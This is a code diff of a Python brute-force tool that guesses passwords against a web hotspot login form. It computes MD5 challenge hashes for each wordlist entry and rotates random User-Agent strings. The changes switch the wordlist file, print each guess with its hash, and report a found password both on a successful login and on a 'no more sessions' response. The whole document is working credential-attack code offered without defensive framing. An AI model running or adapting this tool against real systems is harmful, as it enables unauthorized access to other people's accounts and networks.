@@ -16,7 +16,7 @@ def password_gen(data):
     md5_file.close()
     return password
 
-with open("wordlist.txt", "r") as wordlist_file:
+with open("benar.txt", "r") as wordlist_file:
     wordlist = wordlist_file.read().splitlines()
 
 randomagent = get_random_user_agent()
@@ -49,10 +49,16 @@ if response.status_code == 200:
                             "dst": "",
                             "popup": "true"
                         }
-                        print(f"Trying password: {password}")
+                        print(f"Trying password: {match.group(1)} + {password} + {match.group(2)} = {password_md5} ")
                         response = requests.post(url, data=L_data, headers=post_headers, timeout=10)
                         if "<h1>You are logged in</h1>" in response.text:
                             print(f"Success login with user {user}")
+                            print(f"Password: {password}")
+                            print(f"User-Agent: {post_randomagent}")
+                            print(f"MD5 Hashing: {password_md5}")
+                            exit()
+                        elif f"no more sessions are allowed for user {user}" in response.text:
+                            print(f"Found password for user {user}")
                             print(f"Password: {password}")
                             print(f"User-Agent: {post_randomagent}")
                             print(f"MD5 Hashing: {password_md5}")
